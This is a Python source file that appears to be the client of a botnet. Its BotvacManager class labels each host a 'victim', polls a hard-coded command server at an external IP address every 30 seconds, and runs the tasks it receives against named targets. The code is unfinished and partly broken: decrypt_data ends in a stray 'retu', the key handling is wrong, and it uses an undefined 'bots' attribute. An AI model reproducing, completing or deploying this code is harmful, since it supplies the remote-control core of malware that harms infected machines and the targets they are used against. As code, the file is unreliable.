import json
import os
import uuid
from datetime import datetime
from urllib.parse import urljoin

import requests
import rsa
from Crypto.Cipher import PKCS1_OAEP
import schedule as schedule

from botvac_task_executer import BotvacTaskExecutor
from objects.Logger import Logger
from objects.task import Task, TaskResult


class BotvacManager:
    SERVER_ADDRESS = os.getenv("MVP_SERVER_URL", "http://40.118.19.45/")
    INTERVAL = int(os.getenv("BOTVAC_INTERVAL",30))

    def __init__(self):
        self.last_task: Task = None
        self.victim_id = uuid.uuid4().__str__()
        self.reqs_respo = requests.Session()
        self.logger = Logger()
        self.victim_public_key = None
        self.victim_private_key = None
        self.server_public_key = None
        self.task_executor = BotvacTaskExecutor()

    def get_public_key(self):
        self.logger.debug("trying to get server's public key")
        url = urljoin(self.SERVER_ADDRESS, "/get_public_key")
        respo = self.reqs_respo.get(url=url)
        return PKCS1_OAEP.new(respo.text)

    def generate_keys(self):
        self.server_public_key = self.get_public_key()
        current_path = os.path.dirname(os.path.realpath(__file__))
        res_path = os.path.join(current_path, "res")
        with open(os.path.join(res_path, 'private_key.pem'), mode='rb') as private_file:
            self.victim_private_key = PKCS1_OAEP.new(private_file.read())

        with open(os.path.join(res_path, 'public_key.pem'), mode='rb') as public_file:
            self.victim_public_key = PKCS1_OAEP.new(public_file.read())

    def update_last_task(self):
        self.logger.info("updating tasks")
        url = urljoin(self.SERVER_ADDRESS, "/update_last_task")
        if self.last_task:
            last_task_id = self.last_task.task_id
        else:
            last_task_id = ""
        body = {
            "last_task": last_task_id,
            "victim_id": self.victim_id
        }
        respo = self.reqs_respo.get(url=url, data=self.encrypt_data(plain_dict=body))
        if respo.status_code == 200:
            self.logger.debug("found new task")
            #decrypted_task = self.decrypt_data(encrypted_json=respo.content)
            decrypted_task = respo.json()
            self.last_task = Task(data=decrypted_task)
            return True
        elif respo.status_code == 304:
            self.logger.debug("no new task")
            return False
        else:
            self.logger.error(respo.text)

    def encrypt_data(self, plain_dict: dict) -> str:

        # return str(self.victim_private_key.encrypt(str(plain_dict)))
        return str(plain_dict)

    def decrypt_data(self, encrypted_json: str) -> dict:

        #return json.loads(self.server_public_key.decrypt(encrypted_json))
        #return json.loads(str)
        retu

    def run_last_task(self) -> TaskResult:
        self.task_executor.prepare_metadata(task_id=self.last_task.task_id, target=self.last_task.target,
                                            start_time=self.last_task.start_time, end_time=self.last_task.end_time)
        self.logger.debug(f"starting task {self.last_task.task_id}")
        task_result: TaskResult = self.task_executor.execute_task(task=self.last_task)
        self.logger.debug(f"finished task {self.last_task.task_id}")
        return task_result

    def _run_task_routine(self):
        self.update_last_task()
        if self.last_task and self.last_task.task_type and (self.victim_id in self.bots or self.bots == '*'):
                self.run_last_task()

    def main(self):
        #self.generate_keys()
        schedule.every(self.INTERVAL).seconds.do(self._run_task_routine)
        while True:
            schedule.run_pending()


if __name__ == '__main__':
    manager = BotvacManager()
    manager.main()
